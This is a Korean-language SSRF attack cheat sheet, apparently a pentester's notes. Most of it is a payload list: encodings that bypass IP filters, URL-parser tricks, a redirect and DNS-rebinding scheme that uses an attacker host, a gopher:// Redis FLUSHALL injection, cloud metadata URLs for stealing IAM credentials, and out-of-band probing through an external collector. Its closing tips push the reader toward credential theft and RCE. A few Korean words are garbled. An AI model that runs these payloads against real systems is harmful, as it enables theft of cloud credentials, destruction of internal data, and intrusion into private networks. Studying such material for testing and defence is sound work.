# 13_SSRF_일반기법

서버가 공격자가 지정한 주소로 요청을 대신 보내도록 속이는 공격. XXE/PDF생성기 외에도 URL을 입력받아 서버가 대신 요청해주는 모든 기능(웹훅, 이미지 가져오기, PDF/URL 미리보기, 결제 연동 등)이 후보다.

---

## 탐지 대상

```
- URL/호스트명을 파라미터로 받는 기능 (예: ?url=, ?callback=, ?webhook=, ?image=)
- 외부 API와 연동하는 기능 (결제 게이트웨이, 오업베이 연동, 웹훅 URL 등록)
- PDF/문서 생성기, URL 미리보기 기능
- SSO/SAML 응답 콜백 URL(SubscribeURL 등)을 검증 없이 그대로 요청하는 엔드포인트
```

---

## 기본 IP 우회 패이로드

```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://0/
http://127.1
http://127.0.1
http://[::1]                    # IPv6 loopback
http://[0:0:0:0:0:ffff:127.0.0.1]  # IPv4-mapped IPv6
http://2130706433               # 127.0.0.1 의 10진수 표현
http://017700000001             # 127.0.0.1 의 8진수 표현
http://0x7f.0x0.0x0.0x1         # 16진수 표현
http://127.0.0.1.nip.io         # 와일드카드 DNS 서비스로 임의 IP를 도메인처럼 위장
```

---

## 기본 검증을 통과하는 URL 파싱 트릭

```
http://expected-host@evil-host/           # userinfo 부분만 검증하는 파서에서 우회
http://evil-host#expected-host            # fragment 뒤에 검증용 호스트명을 붙여서 속임
http://evil-host%2523expected-host
http:///evil-host                         # 슬래시 개수 조작
검증 라이브러리와 실제 HTTP 클라이언트가 같은 URL을 서로 다르게 해석할 때(파서 혼동, parser confusion) 발생
```

---

## 리다이렉트 보내기 (검증이 GET 요청 자체만 검사하고 리다이렉트 후보를 안 따라가는 경우)

```bash
# 내 서버에 페이지 하나 두고, 공격 대상(내부IP)으로 302 리다이렉트 응답을 준비
# 앱이 내 서버 URL을 요청하게 만들면, 검증은 통과하고 실제 요청은 리다이렉트된 내부 주소로 가게 됨
HTTP/1.1 302 Found
Location: http://169.254.169.254/latest/meta-data/
```

---

## DNS 리바인딩 (TOCTOU 공격)

검증과 실제 요청 사이에 시간차가 있다는 점을 이용해, 검증 시점과 요청 시점에 서로 다른 IP를 응답하는 DNS 서버를 운영해서 필터를 우회한다.

```
1. attacker.com 을 공인 IP로 먼저 응답하도록 설정 (검증 통과)
2. TTL을 매우 짧게 설정해서 빨리 만료되게 함
3. 실제 요청(fetch) 시점에는 내부 IP(192.168.1.1 등)로 응답이 바뀌어있어 서버가 내부망으로 요청을 보내게 됨
```

이 공격은 검증과 요청을 반복적으로 반복해야 할 수 있어 blind SSRF에서 유용하다. 방어법(DNS pinning)이 없는 앱에서만 통함.

---

## 프로토콜 스튑링 (Gopher/Dict로 임의 TCP 페이로드 전송)

`gopher://` 스키마는 임의 바이트를 TCP로 전송할 수 있게 해줘서, 내부 HTTP 요청뿐만 아니라 Redis, Memcached 같은 텍스트 기반 프로토콜을 쟁타꾸 거나 SMTP로 메일도 보낼 수 있다.

```
gopher://<내부IP>:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A   # Redis 명령 주입 예시 (인코딩된 RESP 프로토콜)
dict://<내부IP>:11211/stats                              # Memcached 상태 조회
```

이 기법은 SSRF를 단순 정보수집을 넘어 내부 서비스 RCE로 확장시키는 데 쓰인다 (SSRF를 이용해 Redis 설정을 바꿔 SSH 키를 쓰거나 크론잡으로 이어지는 사례가 대표적).

---

## 클라우드 메타데이터 탈취

```bash
# AWS IMDSv1 (토큰 없이 바로 접근 가능)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<롤명>

# AWS IMDSv2 (토큰 발급 단계가 필요, SSRF로 헤더 조작이 되면 우회 가능)
# PUT 요청으로 토큰 요청 -> GET에 헤더로 붙여서 재요청, SSRF가 메서드/헤더를 임의로 지정 못하면 막혀있음

# GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# GCP는 반드시 헤더 필요: Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Azure도 헤더 필요: Metadata: true
```

---

## Blind SSRF 탐지 (응답이 안 보일 때)

```bash
# Burp Collaborator / interactsh 등 외부 수신 서버로 요청을 넣어본다
url=http://<수신서버>.oastify.com

# 응답 시간 차이로 판단 (내부 포트 열림/닫힌 것 비교)
url=http://<내부IP>:80    # 열린 포트는 빠른 응답, 닫힌 포트는 타임아웃 대기 시간
```

---

## 팁

- SSRF가 확인되면 즉시 클라우드 메타데이터 엔드포인트부터 시도 (IAM 토큰/자격증명이 목표인 경우가 많음)
- 간단한 IP 블랙리스트만 걸려있으면 IP 인코딩(10진수/8진수/16진수) 또는 와일드카드 DNS([nip.io](http://nip.io))로 우회
- 응답이 그대로 반영되지 않으면 blind 취급하고 OOB 수신서버로 대체
- gopher 프로토콜은 SSRF를 단순정보수집이 아니라 RCE로 확장하는 핵심 경로이니 내부 서비스(Redis, DB 등)가 확인되면 반드시 시도